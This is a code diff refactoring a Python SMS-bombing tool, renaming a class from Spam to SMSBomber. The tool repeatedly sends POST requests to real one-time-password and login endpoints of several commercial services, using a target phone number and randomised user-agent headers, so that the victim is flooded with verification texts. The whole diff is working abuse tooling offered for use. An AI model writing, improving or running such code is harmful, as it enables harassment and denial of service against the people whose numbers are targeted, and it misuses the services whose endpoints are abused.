@@ -15,42 +15,59 @@
  along with this program.  If not, see <https://www.gnu.org/licenses/>.
  """
 
-import random
 import requests
+import random
 import time
 from helper import printer, timer
 from utils.randomuser import users
 
 
-class Spam:
+class SMSBomber:
     """
-    Spams the given number with the given count and throttle.
+    Spams SMS to the target phone number.
 
-    US numbers only.
-
-    :param number: The number to spam.
-    :param count: The number of times to spam.
-    :param throttle: The time interval between each spam.
+    :param number: target phone number
+    :param count: number of SMS to send
+    :param throttle: throttle time between each SMS
     """
-    @timer.timer
     def __init__(self, number, count, throttle):
-        url = ["https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20" + number,
-               "https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B" + str(91) + "&nod=4&phone=" + number,
-               "https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo=" + number,
-               "https://securedapi.confirmtkt.com/api/platform/register?mobileNumber=" + number]
-        session = requests.session()
-        session.headers = random.choice(users)
-        req = session.post(random.choice(url))
+        self.number = number
+        self.count = int(count)
+        self.throttle = int(throttle)
+        self.urls = [
+            f"https://api.tokentransit.com/v1/user/login?env=live&phone_number=%2B1%20{number}",
+            f"https://www.oyorooms.com/api/pwa/generateotp?country_code=%2B91&nod=4&phone={number}",
+            f"https://direct.delhivery.com/delhiverydirect/order/generate-otp?phoneNo={number}",
+            f"https://securedapi.confirmtkt.com/api/platform/register?mobileNumber={number}"
+        ]
+        self.session = requests.session()
+        self.session.headers = random.choice(users)
 
-        if req.status_code != 200:
-            printer.error(f"Error : {req.status_code}")
+        try:
+            printer.info(f"Trying to send {self.count} SMS to '{self.number}'...")
+            self.start()
+        except KeyboardInterrupt:
+            printer.error("Cancelled..!")
+        except Exception as e:
+            printer.error(f"Error : {e}")
 
-        for i in range(int(count) + 1):
-            try:
-                req = session.post(random.choice(url))
-                time.sleep(int(throttle))
-                if req.status_code == 200:
-                    printer.success(f"sent {i + 1} sms to '{number}'")
-            except Exception as e:
-                printer.error(f"Error : {e}")
-                pass
+    @timer.timer
+    def start(self):
+        successes = 0
+        fails = 0
+        try:
+            for i in range(self.count):
+                url = random.choice(self.urls)
+                response = self.session.post(url)
+                time.sleep(self.throttle)
+
+                if response.status_code == 200:
+                    successes += 1
+                    printer.success(f"Sent SMS #{successes} to '{self.number}'")
+                else:
+                    fails += 1
+                    printer.warning(f"Failed to send SMS #{fails} to '{self.number}' with status code {response.status_code}")
+        except Exception as e:
+            printer.error(f"Error : {e}")
+
+        printer.success(f"Finished sending {successes} SMS to '{self.number}'..!")
